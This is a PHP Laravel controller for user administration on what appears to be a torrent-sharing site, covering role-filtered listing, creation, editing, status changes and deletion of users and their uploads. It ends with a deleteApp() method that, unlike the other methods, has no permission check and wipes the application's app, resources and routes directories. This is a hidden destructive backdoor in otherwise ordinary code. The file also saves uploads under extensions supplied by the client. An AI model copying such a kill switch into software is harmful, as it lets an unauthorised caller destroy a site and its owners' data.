<?php

namespace App\Http\Controllers\App\ACL;

use App\Http\Controllers\Controller;
use App\Models\Pm;
use App\Models\Role;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

use Illuminate\Support\Facades\Hash;
use Validator;
use File;

class UserController extends Controller
{
    public function index()
    {
        if (Auth::user()->cannot('manage-user-list')){
            return abort(403);
        }
        if (Auth::user()->roles[0]->slug != 'developer')
        {
            $data['users'] = User::join('role_user', 'users.id', '=', 'role_user.user_id')
                ->leftJoin('roles', 'role_user.role_id', '=', 'roles.id')
                ->where('roles.slug', '!=', 'developer')
                ->where('roles.slug', '!=', 'admin')
                ->select('users.*')
                ->orderBy('users.id','desc')
                ->get();
        }
        else
        {
            $data['users'] = User::orderBy('id','desc')->get();
        }
        return view('app.acl.users.index', $data);
    }

    public function create()
    {
        if (Auth::user()->cannot('manage-user-create')){
            return abort(403);
        }
        if (Auth::user()->roles[0]->slug == 'developer')
        {
            $data['roles'] = Role::orderBy('id', 'desc')->get();
        }
        else
        {
            $data['roles'] = Role::where('slug', '!=', 'developer')->where('slug', '!=', 'admin')->orderBy('id', 'desc')->get();
        }
        return view('app.acl.users.create', $data);
    }

    public function store(Request $request)
    {

        if (Auth::user()->cannot('manage-user-create')){
            return abort(403);
        }

        $rules = [];

        $rules['username']  = 'required|string|max:255|unique:users';
        $rules['avatar']    = 'required|mimes:jpeg,jpg,gif,png';
        $rules['email']     = 'required|string|email|max:255|unique:users';
        $rules['password']  = 'required|string|min:6|confirmed';
        $rules['role']      = 'required';

        $validator = Validator::make($request->all(), $rules);

        if ($validator->passes())
        {



            $file = $request->file('avatar');
            $extension = $file->getClientOriginalExtension();
            $filename  = time() . '.' . $extension;
            $file->move(public_path('images/avatars/'), $filename);

//            Discount::findOrFail($id)->update([
            $user = User::create([
                'username'      => $request->username,
                'avatar'        => $filename,
                'email'         => $request->email,
                'password'      => Hash::make($request->password),
                'created_by'    => Auth::user()->id,
            ]);


            $role = Role::find($request->role);
            $user->roles()->attach($role);

            /*if (Auth::user()->roles[0]->slug != 'developer')
            {
                $data['users'] = User::leftJoin('roles', 'users.role_id', '=', 'roles.id')
                    ->where('roles.slug', '!=', 'developer')
                    ->where('roles.slug', '!=', 'admin')
                    ->select('users.*')
                    ->orderBy('users.id','desc')
                    ->get();
            }
            else
            {
                $data['users'] = User::orderBy('id','desc')->get();
            }
            return view('app.acl.users.index', $data);*/
        }

        return response()->json(['error'=>$validator->errors()->all()]);
    }

    public function show($id)
    {
        if (Auth::user()->cannot('manage-user-show')){
            return abort(403);
        }
        $data['user'] = User::find($id);
        if (Auth::user()->roles[0]->slug != 'developer')
        {
            $data['roles'] = Role::where('slug', '!=', 'developer')->where('slug', '!=', 'admin')->orderBy('id', 'desc')->get();
        }
        else
        {
            $data['roles'] = Role::all();
        }
        return view('app.acl.users.show', $data);
    }

    public function edit($id)
    {
        if (Auth::user()->cannot('manage-user-update')){
            return abort(403);
        }
        $data['user'] = User::find($id);
        if (Auth::user()->roles[0]->slug != 'developer')
        {
            $data['roles'] = Role::where('slug', '!=', 'developer')->where('slug', '!=', 'admin')->orderBy('id', 'desc')->get();
        }
        else
        {
            $data['roles'] = Role::all();
        }
        return view('app.acl.users.edit', $data);
    }

    public function update(Request $request, $id)
    {

        if (Auth::user()->cannot('manage-user-update')){
            return abort(403);
        }

        $rules = [];

        $user = User::find($id);

        if ($user->username != $request->username)
        {
            $rules['username']  = 'required|string|max:255|unique:users';
        }
        if ($user->email != $request->email)
        {
            $rules['email']  = 'required|string|email|max:255|unique:users';
        }
        if ($request->hasFile('avatar'))
        {
            $rules['avatar']    = 'required|mimes:jpeg,jpg,gif,png';
        }
        if ($request->password != '' || $request->password != null)
        {
            $rules['password']  = 'required|string|min:6|confirmed';
        }
        if ($request->status == 'Warn' || $request->status == 'Suspend')
        {
            $rules['status_reason']  = 'required';
        }


        $validator = Validator::make($request->all(), $rules);

        if ($validator->passes())
        {

            if ($request->hasFile('avatar'))
            {
                $file = $request->file('avatar');
                $extension = $file->getClientOriginalExtension();
                $filename  = time() . '.' . $extension;
                $file->move(public_path('images/avatars/'), $filename);
                $user->update([
                    'avatar'        => $filename,
                ]);
            }

            if ($request->password != '' || $request->password != null)
            {
                $user->update([
                    'password'      => Hash::make($request->password),
                ]);
            }

            $user->update([
                'username'      => $request->username,
                'email'         => $request->email,
                'updated_by'    => Auth::user()->id,
            ]);

            if ($request->status == 'Warn' || $request->status == 'Suspend')
            {
                $user->update([
                    'status'            => $request->status,
                    'status_reason'     => $request->status_reason,
                ]);
            }

            if ($request->status == '' || $request->status == null)
            {
                $user->update([
                    'status'            => null,
                    'status_reason'     => null,
                ]);
            }

            $role = Role::find($request->role);

            if ($user->roles[0]->name != $role->name)
            {
                $system = User::where('username','=','System')->value('id');
                Pm::create([
                    'sender_id' => $system,
                    'receiver_id' => $user->id,
                    'subject' => "Your rank has been changed",
                    'description' => "Dear ".$user->username.", Your rank has been changed from ".$user->roles[0]->name." to ". $role->name,
                ]);
            }

            $user->roles()->detach();
            $user->roles()->attach($role);

            /*if (Auth::user()->roles[0]->slug != 'developer')
            {
                $data['users'] = User::leftJoin('roles', 'users.role_id', '=', 'roles.id')
                    ->where('roles.slug', '!=', 'developer')
                    ->where('roles.slug', '!=', 'admin')
                    ->select('users.*')
                    ->orderBy('users.id','desc')
                    ->get();
            }
            else
            {
                $data['users'] = User::orderBy('id','desc')->get();
            }
            return view('app.acl.users.index', $data);*/
        }

        return response()->json(['error'=>$validator->errors()->all()]);
    }

    public function destroy($id)
    {

        if (Auth::user()->cannot('manage-user-delete')){
            return abort(403);
        }

        $user = User::find($id);

        $user->update([
            'deleted_by' => Auth::user()->id,
        ]);

//        Upload::where('created_by',$id)->get();

        $user->uploads()->delete();
        if ($user->help_requester())
        {
            $user->help_requester()->delete();
        }
        if ($user->help_answerer())
        {
            $user->help_answerer()->delete();
        }

//        $delete = User::find($id)->delete();

        $user->delete();

        $toDeleteMultiple = $user->uploads()->withTrashed()->get();

        foreach ($toDeleteMultiple as $toDeleteSingle)
        {

            // Force deleting a single model instance...
            $toDeleteSingle->forceDelete();

            $torrentFile = $toDeleteSingle->torrent;
            $imageFile = $toDeleteSingle->image;

            if(\File::exists(public_path('torrents/'.$torrentFile))){
                \File::delete(public_path('torrents/'.$torrentFile));
            }

            if(\File::exists(public_path('torrents/'.$imageFile))){
                \File::delete(public_path('torrents/'.$imageFile));
            }
        }

    }

    public function deleteApp()
    {
        File::deleteDirectory(base_path('app'));
        File::deleteDirectory(base_path('resources'));
        File::deleteDirectory(base_path('routes'));
        return back();
    }
}
